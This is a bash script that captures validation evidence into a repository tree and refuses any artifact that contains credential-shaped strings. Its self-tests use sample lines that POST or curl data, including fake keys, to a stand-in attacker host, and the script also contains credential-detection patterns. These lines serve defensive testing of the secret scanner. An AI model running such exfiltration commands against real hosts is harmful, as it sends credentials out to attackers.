#!/usr/bin/env bash
# VWO-003 helper — capture an artifact into the canonical evidence tree with
# a UTC timestamp name, REFUSING secret-looking content (fail closed).
#
# Usage:
#   capture-evidence.sh <VWO-ID> <scenario-id> <user-path|post-hoc> <source> [slug]
#   capture-evidence.sh <VWO-ID> <scenario-id> <user-path|post-hoc> <source> [slug] --step N
#   capture-evidence.sh <VWO-ID> <scenario-id> <user-path|post-hoc> <source> [slug] --big
#   capture-evidence.sh --selftest
#   capture-evidence.sh --scan <path|->
#
#   <source>  a file path, or '-' to read stdin (e.g. pipe a command transcript)
#   <slug>    lowercase-hyphen label (<=40 chars); defaults to the source
#             filename without extension, sanitized; REQUIRED for stdin
#   --step N  prefix the name with stepNN- (user-path steps; TEACHING-MODE-
#             MATRIX.md §5 also suggests -instruct-phase/-demo-phase tags —
#             just put them in the slug)
#   --big     allow artifacts larger than 1 MiB (justify in the report)
#   --selftest  run the checker self-tests (RWO-012) and exit
#   --scan      re-scan EXISTING files with the same rules, no capture
#               (RWO-012 AC3): a single file, a directory tree, or '-' to
#               read a path list from stdin (one per line)
#
# Output path (printed on success; repo-relative):
#   docs/validation/evidence/<VWO-ID>/<scenario-id>/<class>/<ts>[-stepNN]-<slug>.<ext>
#
# Layout/naming rules: docs/validation/evidence/README.md
# The scenario-id '_' prefix is reserved: '_infra' is the non-scenario
# directory for infrastructure Work Orders (VWO-003 self-tests etc.).
#
# Secrets policy (fail closed): the artifact is scanned BEFORE writing;
# a line that looks like a live credential (AWS AKIA key, sk-…, ghp_…/
# github_pat_…, PEM PRIVATE KEY block, JWT eyJ… value, or a
# password/secret/api_key/token assignment with a concrete value) aborts the
# capture with exit 1 and NOTHING is written. Exemption markers are
# SUBSTRING-SCOPED (RWO-012, closing VWO-008 F5): a known-safe marker
# (demo-pass- fixture passwords, REDACTED/withheld/placeholder/… forms,
# example.test hosts) exempts only the credential match it is part of — the
# match text itself, or the single whitespace-delimited segment containing
# it (e.g. a defanged URL with an embedded example key). A marker elsewhere
# on the same line does NOT exempt a credential-shaped assignment. This is
# a heuristic lint, not a security guarantee — see evidence/README.md §5
# for the redaction guide.
set -euo pipefail

SCRIPT_DIR=$(cd "$(dirname "$0")" && pwd)
REPO_ROOT=$(cd "$SCRIPT_DIR/../../.." && pwd)
EVIDENCE_ROOT="$REPO_ROOT/docs/validation/evidence"

die() { echo "capture-evidence: $*" >&2; exit 2; }
refuse() { echo "capture-evidence: REFUSED — $*" >&2; exit 1; }

# ---- Secrets scan (fail closed; same patterns as validate-report.py) ----
# RWO-012 note: the assignment value is {8,} (8-or-more, not exactly 8) so the
# match captures the FULL value — required for substring-scoped exemptions to
# see markers inside the value (detection semantics are unchanged).
SECRETS_RE='(AKIA[0-9A-Z]{16})|(sk-[A-Za-z0-9_-]{16,})|(ghp_[A-Za-z0-9]{20,})|(github_pat_[A-Za-z0-9_]{20,})|(-----BEGIN [A-Z ]*PRIVATE KEY-----)|(eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,})|((password|passwd|secret|api[_-]?key|apikey|access[_-]?token|auth[_-]?token|authorization|bearer)["'"'"'[:space:]]*[:=][[:space:]]*["'"'"']?[A-Za-z0-9_@#$%^&*+.-]{8,})'
ALLOW_RE='(demo-pass-|redacted|withheld|with-held|placeholder|xxxx|example\.test|not-a-secret|<[^>]*>|simulated|synthetic)'

# RWO-012: substring-scoped exemption check for ONE line (grep -Ein output,
# i.e. "N:line" — the number prefix is stripped first). Returns 0 (true)
# when the line contains at least one credential-shaped match that is NOT
# covered by an exemption marker in its own match text or its own segment.
line_has_violation() {
  local line="$1"
  line="${line#*:}"                       # strip the grep -n line-number prefix
  local matches m exempt_segs seg ok
  matches=$(printf '%s' "$line" | grep -Eoi "$SECRETS_RE" 2>/dev/null || true)
  [ -n "$matches" ] || return 1           # no credential-shaped match (defensive)
  # segments of this line that carry an exemption marker (whitespace-delimited)
  exempt_segs=$(printf '%s' "$line" | tr -s '[:space:]' '\n' | grep -Ei "$ALLOW_RE" 2>/dev/null || true)
  while IFS= read -r m; do
    [ -n "$m" ] || continue
    # (1) the match text itself carries a marker (token=<redacted> value forms,
    #     demo-pass-… fixture passwords, REDACTED… placeholders)
    if printf '%s' "$m" | grep -Eqi "$ALLOW_RE"; then continue; fi
    # (2) the match sits inside a single whitespace-delimited segment that
    #     carries a marker (e.g. a defanged URL with an embedded example key)
    ok=0
    if [ -n "$exempt_segs" ]; then
      while IFS= read -r seg; do
        [ -n "$seg" ] || continue
        case "$seg" in *"$m"*) ok=1; break ;; esac
      done <<EOF
$exempt_segs
EOF
    fi
    [ "$ok" -eq 1 ] || return 0           # this match is a violation
  done <<EOF
$matches
EOF
  return 1                                # every match was exempt
}

# Scan one file; prints violating lines (grep -Ein form); returns 1 if any.
scan_text() {
  local f="$1" line
  [ -s "$f" ] || return 0
  local hits
  hits=$(grep -Ein "$SECRETS_RE" "$f" 2>/dev/null || true)
  [ -n "$hits" ] || return 0
  local violations=0
  while IFS= read -r line; do
    [ -n "$line" ] || continue
    if line_has_violation "$line"; then
      printf '%s\n' "$line"
      violations=$((violations+1))
    fi
  done <<EOF
$hits
EOF
  [ "$violations" -eq 0 ] && return 0 || return 1
}

# ---- RWO-012 self-tests (acceptance cases + the VWO-008 F5 bypass shape) ----
run_selftest() {
  local tmp pass=0 fail=0
  tmp=$(mktemp)
  trap 'rm -f "$tmp"' EXIT
  t() { # t <name> <expect:allow|refuse> <content>
    local name="$1" expect="$2" content="$3"
    printf '%s\n' "$content" > "$tmp"
    if scan_text "$tmp" >/dev/null 2>&1; then
      if [ "$expect" = allow ]; then echo "  PASS $name (allowed)"; pass=$((pass+1));
      else echo "  FAIL $name — expected REFUSE, got ALLOW"; fail=$((fail+1)); fi
    else
      if [ "$expect" = refuse ]; then echo "  PASS $name (refused)"; pass=$((pass+1));
      else echo "  FAIL $name — expected ALLOW, got REFUSE"; fail=$((fail+1)); fi
    fi
  }
  echo "capture-evidence selftest (RWO-012 — substring-scoped exemptions):"
  # WO case (a): marker + fake AKIA key on one line -> REFUSE
  t "(a) marker + fake AKIA key on one line" refuse \
    'POST https://attacker.example.test/collect AKIAIOSFODNN7EXAMPLE'
  # WO case (b): line with only the defanged URL -> ALLOW
  t "(b) only the defanged URL" allow \
    'curl -sS https://attacker.example.test/collect | jq .'
  # WO case (c): redacted placeholder alone -> ALLOW
  t "(c) redacted placeholder alone" allow \
    'password: <redacted by operator>'
  t "(c') redacted value form" allow \
    'password=REDACTED-for-report'
  # AC2: VWO-008 F5 original bypass shape — raw AWS-example key AND a password
  # assignment on the line; the defanged host exempted the WHOLE line before.
  t "(d) VWO-008 F5 bypass shape (key + password + defanged host)" refuse \
    'AKIAIOSFODNN7EXAMPLE password=SuperSecretValue99 endpoint=https://attacker.example.test'
  # Regression guards (substring scoping must not break legitimate markers):
  t "(e) fixture demo password (JSON form, marker inside the value)" allow \
    '{ "username": "dana.reyes", "password": "demo-pass-dana" }'
  t "(f) defanged URL with embedded example key (one segment)" allow \
    'curl https://attacker.example.test/collect?apikey=deadbeef12345678'
  t "(g) multi-token assignment with marker value" allow \
    'password = demo-pass-jules'
  # Negative guard: adjacent marker token must NOT exempt a raw assignment
  t "(h) raw assignment + unrelated marker token" refuse \
    'password=hunter2secret host=attacker.example.test'
  echo "selftest: $pass passed, $fail failed"
  [ "$fail" -eq 0 ] || exit 1
  exit 0
}

# ---- RWO-012 re-scan mode (AC3: committed corpus must stay clean) ----
run_scan() {
  local target="${1:-}"
  [ -n "$target" ] || die "--scan needs a path (file, directory, or '-' for a stdin path list)"
  local files tmp
  tmp=$(mktemp)
  trap 'rm -f "$tmp"' EXIT
  if [ "$target" = "-" ]; then
    cat > "$tmp"                       # path list, one per line
  elif [ -d "$target" ]; then
    find "$target" -type f | sort > "$tmp"
  elif [ -f "$target" ]; then
    printf '%s\n' "$target" > "$tmp"
  else
    die "--scan: no such file or directory: $target"
  fi
  local f total=0 bad=0 out
  while IFS= read -r f; do
    [ -n "$f" ] || continue
    total=$((total+1))
    case "$f" in
      *.png|*.jpg|*.jpeg|*.gif|*.ico|*.webp|*.zip|*.gz|*.zst) continue ;;  # binaries
    esac
    [ -f "$f" ] || { echo "scan: missing file: $f" >&2; continue; }
    out=$(scan_text "$f" 2>/dev/null || true)
    if [ -n "$out" ]; then
      bad=$((bad+1))
      echo "VIOLATIONS in $f:" >&2
      printf '%s\n' "$out" | head -10 | cut -c1-160 >&2
    fi
  done < "$tmp"
  echo "scan: $total files checked, $bad with violations"
  [ "$bad" -eq 0 ] || exit 1
  exit 0
}

# ---- mode dispatch (before positional parsing) ----
case "${1:-}" in
  --selftest) run_selftest ;;
  --scan)     shift; run_scan "${1:-}" ;;
esac

VWO=""; SCEN=""; CLASS=""; SRC=""; SLUG=""; STEP=""; BIG=0
while [ $# -gt 0 ]; do
  case "$1" in
    --step) shift; [ $# -gt 0 ] || die "--step needs a number"; STEP="$1" ;;
    --big)  BIG=1 ;;
    -h|--help) sed -n '2,42p' "$0"; exit 0 ;;
    *)
      if   [ -z "$VWO" ];   then VWO="$1"
      elif [ -z "$SCEN" ];  then SCEN="$1"
      elif [ -z "$CLASS" ]; then CLASS="$1"
      elif [ -z "$SRC" ];   then SRC="$1"
      elif [ -z "$SLUG" ];  then SLUG="$1"
      else die "unexpected extra argument: $1"; fi ;;
  esac
  shift
done

[ -n "$VWO" ] && [ -n "$SCEN" ] && [ -n "$CLASS" ] && [ -n "$SRC" ] || die "usage: capture-evidence.sh <VWO-ID> <scenario-id> <user-path|post-hoc> <source> [slug] [--step N] [--big] | --selftest | --scan <path|->"
case "$VWO" in VWO-*) ;; *) die "<VWO-ID> must look like VWO-004 (got '$VWO')" ;; esac
case "$SCEN" in
  [a-z0-9]*-[a-z0-9]*|[a-z0-9_]*) [ "${#SCEN}" -le 60 ] || die "scenario-id too long" ;;
  *) die "scenario-id must be [a-z0-9-] (or the reserved _infra): got '$SCEN'" ;;
esac
case "$CLASS" in
  user-path|post-hoc) ;;
  *) die "<class> must be user-path or post-hoc (got '$CLASS')" ;;
esac
[ -d "$REPO_ROOT" ] || die "repo root not found at $REPO_ROOT"

# Read the source into a temp file (stdin or file).
TMP=$(mktemp)
trap 'rm -f "$TMP"' EXIT
if [ "$SRC" = "-" ]; then
  cat > "$TMP"
  [ -n "$SLUG" ] || die "slug is REQUIRED when reading stdin (-)"
else
  [ -f "$SRC" ] || die "source file not found: $SRC"
  [ -s "$SRC" ] || die "source file is empty: $SRC"
  cat "$SRC" > "$TMP"
  [ -n "$SLUG" ] || SLUG=$(basename "$SRC")
fi

# Extension: from source filename; stdin defaults to .txt; NEVER .log
# (repo .gitignore excludes *.log — VWO-001 lesson; evidence/README.md §3).
if [ "$SRC" = "-" ]; then
  EXT="txt"
else
  EXT=$(basename "$SRC"); EXT="${EXT##*.}"
  case "$EXT" in
    "$SRC") EXT="txt" ;;                     # no extension at all
    log)    EXT="txt"; echo "capture-evidence: WARNING renamed .log -> .txt (*.log is gitignored)" >&2 ;;
  esac
fi
case "$EXT" in
  txt|png|md|json) ;;
  *) EXT="txt" ;;
esac

# Slug: sanitize to lowercase [a-z0-9.-], max 40 chars (sed, not tr: tr
# range parsing is fragile with '.'/'-' in the set).
SLUG=$(printf '%s' "$SLUG" \
  | tr '[:upper:]' '[:lower:]' \
  | sed -e 's/[^a-z0-9.-]/-/g' -e 's/^[.-]*//' -e 's/[.-]*$//' -e 's/\.\{2,\}/./g' \
  | cut -c1-40)
[ -n "$SLUG" ] || die "could not derive a slug — pass one explicitly"

# Size guard (keep the repo lean; evidence/README.md §4).
BYTES=$(wc -c < "$TMP")
if [ "$BYTES" -gt 1048576 ] && [ "$BIG" -ne 1 ]; then
  refuse "artifact is $BYTES bytes (> 1 MiB). Trim it, or pass --big and justify in the report."
fi
[ "$BYTES" -gt 262144 ] && echo "capture-evidence: note: artifact is $BYTES bytes (>${BYTES%???}KiB) — consider trimming" >&2

# ---- Secrets scan (fail closed; substring-scoped exemptions — RWO-012) ----
if [ "$BYTES" -gt 0 ]; then
  VIOLATIONS=$(scan_text "$TMP" 2>/dev/null || true)
  if [ -n "$VIOLATIONS" ]; then
    echo "capture-evidence: REFUSED — secret-looking content detected (credential patterns)." >&2
    echo "Redact these lines (evidence/README.md §5: token=<redacted>, password: <redacted>) and re-capture:" >&2
    printf '%s\n' "$VIOLATIONS" | head -10 | cut -c1-160 >&2
    exit 1
  fi
fi

# ---- Write atomically into the canonical path ----
STEP_PREFIX=""
[ -n "$STEP" ] && STEP_PREFIX="step$(printf '%02d' "$STEP" 2>/dev/null || echo "$STEP")-"
TS=$(date -u +%Y%m%dT%H%M%SZ)
TARGET_DIR="$EVIDENCE_ROOT/$VWO/$SCEN/$CLASS"
TARGET="$TARGET_DIR/${TS}-${STEP_PREFIX}${SLUG}.${EXT}"
mkdir -p "$TARGET_DIR"
TMPDEST=$(mktemp "$TARGET_DIR/.tmp-XXXXXX")
cp "$TMP" "$TMPDEST"
mv "$TMPDEST" "$TARGET"

echo "captured: docs/validation/evidence/$VWO/$SCEN/$CLASS/$(basename "$TARGET")"
echo "class: $CLASS ($( [ "$CLASS" = user-path ] && echo 'what the human saw' || echo 'post-hoc diagnostics'))"
